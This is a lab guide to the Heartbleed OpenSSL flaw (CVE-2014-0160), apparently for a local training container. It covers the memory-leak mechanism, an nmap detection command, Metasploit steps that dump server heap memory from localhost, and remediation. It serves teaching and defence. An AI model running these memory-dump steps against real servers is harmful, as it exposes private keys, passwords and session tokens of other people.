# OpenSSL Heartbleed TLS Memory Dump Vulnerability (CVE-2014-0160)

## Overview

The Heartbleed bug (CVE-2014-0160) is one of the most famous cryptographic security flaws in internet history. It affects the OpenSSL implementation of the TLS/DTLS Heartbeat Extension (RFC 6520) in OpenSSL versions 1.0.1 through 1.0.1f.

The Heartbeat extension allows a client or server to verify that the secure connection is still active without renegotiating the handshake. The client sends a payload along with a 16-bit integer stating the payload's length, and the server echoes back the payload. In vulnerable OpenSSL versions, the server allocates an output buffer based on the client-specified length parameter **without verifying whether the actual payload buffer contains that many bytes**. If an attacker sends a 1-byte payload but declares a length of 65,535 bytes (64 KB), OpenSSL copies the 1 byte followed by 65,534 bytes of adjacent server process memory into the heartbeat response, leaking private SSL keys, user passwords, session tokens, and cleartext communications.

- **Primary Interface**: HTTPS Port `8443` (`https://localhost:8443`)
- **Docker Shortcut**: `./lab start heartbleed`
- **Container Name**: `cyberlab_04_heartbleed_openssl`
- **RAM Footprint**: ~50 MB (Nginx + OpenSSL 1.0.1c)

---

## Architecture & Memory Leak Diagram

```
+-------------------------------------------------------------+
|                Attacker Machine                             |
|  Sends Heartbeat Request:                                   |
|    - Payload Length declared: 65,535 bytes (64 KB)          |
|    - Actual Payload sent: 1 byte ('A')                      |
+-------------------------------------------------------------+
                               |
                        TLS Port 8443
                               v
+-------------------------------------------------------------+
|               Vulnerable OpenSSL Server (1.0.1c)            |
|                                                             |
|  1. Allocates 64 KB memory buffer                           |
|  2. Copies 1 byte ('A') into buffer                         |
|  3. Copies next 65,534 bytes of adjacent heap memory:       |
|     [ ... SSL Private Keys | Session Cookies | Passwords ...]|
|  4. Transmits 64 KB back to attacker                        |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Verification with Nmap Heartbleed Script

Verify that the target TLS service is vulnerable to Heartbleed:

```bash
nmap -p 8443 --script ssl-heartbleed localhost
```

The output will state `VULNERABLE: The Heartbleed Bug`.

### 2. Dumping Memory with Metasploit

```bash
msfconsole -q
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 127.0.0.1
set RPORT 8443
set action DUMP
run
```

Metasploit will extract 64 KB chunks of server heap memory and save the memory dump directly to disk for analysis.

---

## Defensive Remediation & Hardening

1. **Upgrade OpenSSL**:
   Upgrade to OpenSSL 1.0.1g, 1.1.1, or modern 3.x series.
2. **Recompile with `-DOPENSSL_NO_HEARTBEATS`**:
   If compiling from source on legacy platforms, disable the heartbeat extension entirely during build time.
3. **Revoke and Reissue Certificates**:
   Because memory dumps may have exposed the server's private key, revoke any existing TLS certificates and issue fresh keys.

---

## Video Walkthroughs & Technical References

- [Heartbleed, Running the Code - Computerphile](https://www.youtube.com/watch?v=1dOCHwf8zVQ)
- [HeartBleed Vulnerability and Tmux Exploitation | CTF Walkthrough](https://www.youtube.com/watch?v=Pi5HVQlxgdc)
- [NIST CVE-2014-0160 Vulnerability Record](https://nvd.nist.gov/vuln/detail/cve-2014-0160)
- [Vulhub OpenSSL Heartbleed Advisory](https://vulhub.org/#/environments/openssl/heartbleed/)
